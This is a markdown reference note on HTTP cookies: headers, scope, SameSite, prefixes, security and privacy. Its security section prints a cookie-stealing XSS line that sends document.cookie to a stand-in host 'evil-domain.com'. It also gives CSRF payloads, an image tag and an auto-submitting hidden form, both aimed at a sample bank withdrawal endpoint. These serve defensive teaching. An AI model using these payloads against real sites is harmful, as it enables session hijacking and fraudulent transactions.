## HTTP cookies
- An HTTP cookie (web cookie, browser cookie) is a small piece of data that a server sends to the user's web browser. The browser may store it and send it back with the next request to the same server. Typically, it's used to tell if two requests came from the same browser — keeping a user logged-in, for example. It remembers stateful information for the stateless HTTP protocol.
- Cookies are mainly used for three purposes:
    - Session management
        - Logins, shopping carts, game scores, or anything else the server should remember
    - Personalization
        - User preferences, themes, and other settings
    - Tracking
        - Recording and analyzing user behavior
- Cookies were once used for general client-side storage. While this was legitimate when they were the only way to store data on the client, it is recommended nowadays to prefer modern storage APIs. Cookies are sent with every request, so they can worsen performance (especially for mobile data connections). Modern APIs for client storage are the Web storage API (localStorage and sessionStorage) and IndexedDB.

### Creating cookies
- When receiving an HTTP request, a server can send a Set-Cookie header with the response. The cookie is usually stored by the browser, and then the cookie is sent with requests made to the same server inside a Cookie HTTP header. An expiration date or duration can be specified, after which the cookie is no longer sent. Additionally, restrictions to a specific domain and path can be set, limiting where the cookie is sent.
- The Set-Cookie and Cookie headers
    - The Set-Cookie HTTP response header sends cookies from the server to the user agent. A simple cookie is set like this:
    ~~~text
    Set-Cookie: <cookie-name>=<cookie-value>
    ~~~
    - This header from the server tells the client to store a cookie.
    ~~~text
    HTTP/2.0 200 OK
    Content-type: text/html
    Set-Cookie: yummy_cookie=choco
    Set-Cookie: tasty_cookie=strawberry
    [page content]
    ~~~
- Now, with every new request to the server, the browser will send back all previously stored cookies to the server using the Cookie header.
~~~text
GET /sample_page.html HTTP/2.0
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
~~~
- Session cookies
    - The cookie created above is a session cookie: it is deleted when the client shuts down, because it didn't specify an Expires or Max-Age directive. However, web browsers may use session restoring, which makes most session cookies permanent, as if the browser was never closed.
- Permanent cookies
    - Instead of expiring when the client closes, permanent cookies expire at a specific date (Expires) or after a specific length of time (Max-Age).
    ~~~text
    Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
    ~~~
- Secure and HttpOnly cookies    
    - A secure cookie is only sent to the server with an encrypted request over the HTTPS protocol. Even with Secure, sensitive information should never be stored in cookies, as they are inherently insecure and this flag can't offer real protection. Starting with Chrome 52 and Firefox 52, insecure sites (http:) can't set cookies with the Secure directive.
    - To help mitigate cross-site scripting (XSS) attacks, HttpOnly cookies are inaccessible to JavaScript's Document.cookie API; they are only sent to the server. For example, cookies that persist server-side sessions don't need to be available to JavaScript, and the HttpOnly flag should be set.
    ~~~text
    Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
    ~~~
- Scope of cookies
- The Domain and Path directives define the scope of the cookie: what URLs the cookies should be sent to.
- Domain specifies allowed hosts to receive the cookie. If unspecified, it defaults to the host of the current document location, excluding subdomains. If Domain is specified, then subdomains are always included.
- For example, if Domain=mozilla.org is set, then cookies are included on subdomains like developer.mozilla.org.
- Path indicates a URL path that must exist in the requested URL in order to send the Cookie header. The %x2F ("/") character is considered a directory separator, and subdirectories will match as well.
- For example, if Path=/docs is set, these paths will match:
    - /docs
    - /docs/Web/
    - /docs/Web/HTTP
- SameSite cookies 
    - SameSite cookies let servers require that a cookie shouldn't be sent with cross-site (where Site is defined by the registrable domain) requests, which provides some protection against cross-site request forgery attacks (CSRF).
    - SameSite cookies are relatively new and supported by all major browsers.
    - Here is an example:
    ~~~text
    Set-Cookie: key=value; SameSite=Strict
    ~~~  
    - The same-site attribute can have one of two values (case-insensitive):
        - Strict
            - If a same-site cookie has this attribute, the browser will only send cookies if the request originated from the website that set the cookie. If the request originated from a different URL than the URL of the current location, none of the cookies tagged with the Strict attribute will be included.
        - Lax
            - If the attribute is set to Lax, same-site cookies are withheld on cross-site subrequests, such as calls to load images or frames, but will be sent when a user navigates to the URL from an external site, for example, by following a link.
    - The default behavior if the flag is not set, or not supported by the browser, is to include the cookies in any request, including cross-origin requests.
- Cookie prefixes 
    - The design of the cookie mechanism is such that a server is unable to confirm a cookie was set on a secure origin or indeed, tell where a cookie was originally set. Recall that a subdomain such as application.example.com can set a cookie that will be sent with requests to example.com or other sub-domains by setting the Domain attribute:
    ~~~text
    Set-Cookie: CSRF=e8b667; Secure; Domain=example.com
    ~~~
    - If a vulnerable application is available on a sub-domain, this mechanism can be abused in a session fixation attack. When the user visits a page on the parent domain (or another subdomain), the application may trust the existing value sent in the user's cookie. This could allow an attacker to bypass CSRF protection or hijack a session after the user logs in.
    - Alternatively, if the parent domain does not use HSTS with includeSubdomains set, a user subject to an active MitM (perhaps connected to an open WiFi network) could be served a response with a Set-Cookie header from a non-existent sub-domain. The end result would be much the same, with the browser storing the illegitimate cookie and sending it to all other pages under example.com.
    - Session fixation should primarily be mitigated by regenerating session cookie values when the user authenticates (even if a cookie already exists) and by tieing any CSRF token to the user. As a defence in depth measure, however, it is possible to use cookie prefixes to assert specific facts about the cookie. Two prefixes are available:
    - __Host-
        - If a cookie name has this prefix, it will only be accepted in a Set-Cookie directive if it is marked Secure, does not include a Domain attribute and was sent from a secure origin. In this way, these cookies can be seen as "domain-locked".
    - __Secure-
        - If a cookie name has this prefix, it will only be accepted in a Set-Cookie directive if it is marked Secure and was sent from a secure origin. This is weaker than the __Host- prefix.
    - Cookies sent which are not compliant will be rejected by the browser. Note that this ensures that if a sub-domain were to create a cookie with this name, it would be either be confined to the sub-domain or ignored completely. As the application server will only check for a specific cookie name when determining if the user is authenticated or a CSRF token is correct, this effectively acts as a defence measure against session fixation.
- JavaScript access using Document.cookie
- New cookies can also be created via JavaScript using the Document.cookie property, and if the HttpOnly flag is not set, existing cookies can be accessed from JavaScript as well.
~~~text
document.cookie = "yummy_cookie=choco"; 
document.cookie = "tasty_cookie=strawberry"; 
console.log(document.cookie); 
// logs "yummy_cookie=choco; tasty_cookie=strawberry"
~~~
- Cookies created via JavaScript cannot include the HttpOnly flag.
- Please note the security issues in the Security section below. 
- Cookies available to JavaScript can be stolen through XSS.

### Security
- Information should be stored in cookies with the understanding that all cookie values will be visible to and can be changed by the end-user. Depending on the application, it may be desirable to use an opaque identifier which is looked-up server-side or investigate alternative authentication/confidentiality mechanisms such as JSON Web Tokens.
- Session hijacking and XSS
    - Cookies are often used in web application to identify a user and their authenticated session, so stealing a cookie can lead to hijacking the authenticated user's session. Common ways to steal cookies include Social Engineering or exploiting an XSS vulnerability in the application.
~~~text
(new Image()).src = "http://www.evil-domain.com/steal-cookie?cookie=" + document.cookie;
~~~
- The HttpOnly cookie attribute can help to mitigate this attack by preventing access to cookie value through JavaScript. Exfiltration avenues can be limited by deploying a strict Content-Security-Policy.
- Cross-site request forgery (CSRF)
    - Wikipedia mentions a good example for CSRF. In this situation, someone includes an image that isn’t really an image (for example in an unfiltered chat or forum), instead it really is a request to your bank’s server to withdraw money:
    ~~~text 
    <img src="https://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
    ~~~
    - Now, if you are logged into your bank account and your cookies are still valid (and there is no other validation), you will transfer money as soon as you load the HTML that contains this image. For endpoints that require a POST request, it's possible to programmatically trigger a <form> submit (perhaps in an invisible <iframe>) when the page is loaded:
    ~~~text 
    <form action="https://bank.example.com/withdraw" method="POST">
      <input type="hidden" name="account" value="bob">
      <input type="hidden" name="amount" value="1000000">
      <input type="hidden" name="for" value="mallory">
    </form>
    <script>window.addEventListener('DOMContentLoaded', (e) => { document.querySelector('form').submit(); }</script>
    ~~~
- There are a few techniques that should be used to prevent this from happening:
    - GET endpoints should be idempotent—actions that enact a change and do not simply retrieve data should require sending a POST (or other HTTP method) request. POST endpoints should not interchangeably accept GET requests with parameters in the query string.
    - A CSRF token should be included in <form> elements via a hidden input field. This token should be unique per user and stored (for example, in a cookie) such that the server can look up the expected value when the request is sent. For all non-GET requests that have the potential to perform an action, this input field should be compared against the expected value. If there is a mismatch, the request should be aborted.
        - This method of protection relies on an attacker being unable to predict the user's assigned CSRF token. The token should be regenerated on sign-in.
    - Cookies that are used for sensitive actions (such as session cookies) should have a short lifetime with the SameSite attribute set to Strict or Lax. (See SameSite cookies above). In supporting browsers, this will have the effect of ensuring that the session cookie is not sent along with cross-site requests and so the request is effectively unauthenticated to the application server.
    - Both CSRF tokens and SameSite cookies should be deployed. This ensures all browsers are protected and provides protection where SameSite cookies cannot help (such as attacks originating from a separate subdomain).
    - For more prevention tips, see the OWASP CSRF prevention cheat sheet.
### Tracking and privacy
- Third-party cookies
    - Cookies have a domain associated to them. If this domain is the same as the domain of the page you are on, the cookies is said to be a first-party cookie. If the domain is different, it is said to be a third-party cookie. While first-party cookies are sent only to the server setting them, a web page may contain images or other components stored on servers in other domains (like ad banners). Cookies that are sent through these third-party components are called third-party cookies and are mainly used for advertising and tracking across the web. See for example the types of cookies used by Google. Most browsers allow third-party cookies by default, but there are add-ons available to block them (for example, Privacy Badger by the EFF).
    - If you are not disclosing third-party cookies, consumer trust might get harmed if cookie use is discovered. A clear disclosure (such as in a privacy policy) tends to eliminate any negative effects of a cookie discovery. Some countries also have legislation about cookies. See for example Wikimedia Foundation's cookie statement.
- Do-Not-Track
    - There are no legal or technological requirements for its use, but the DNT header can be used to signal that a web application should disable either its tracking or cross-site user tracking of an individual user. See the DNT header for more information.
- EU cookie directive
    - Requirements for cookies across the EU are defined in Directive 2009/136/EC of the European Parliament and came into effect on 25 May 2011. A directive is not a law by itself, but a requirement for EU member states to put laws in place that meet the requirements of the directive. The actual laws can differ from country to country.
    - In short the EU directive means that before somebody can store or retrieve any information from a computer, mobile phone or other device, the user must give informed consent to do so. Many websites have added banners (AKA "cookie banners") since then to inform the user about the use of cookies.
    - For more, see this Wikipedia section and consult state laws for the latest and most accurate information.
- Zombie cookies and Evercookies
    - A more radical approach to cookies are zombie cookies or "Evercookies" which are recreated after their deletion and are intentionally hard to delete forever. They are using the Web storage API, Flash Local Shared Objects and other techniques to recreate themselves whenever the cookie's absence is detected.
        - Evercookie by Samy Kamkar
        - Zombie cookies on Wikipedia 
        
### References 
- https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- https://github.com/samyk/evercookie
- https://en.wikipedia.org/wiki/Zombie_cookie        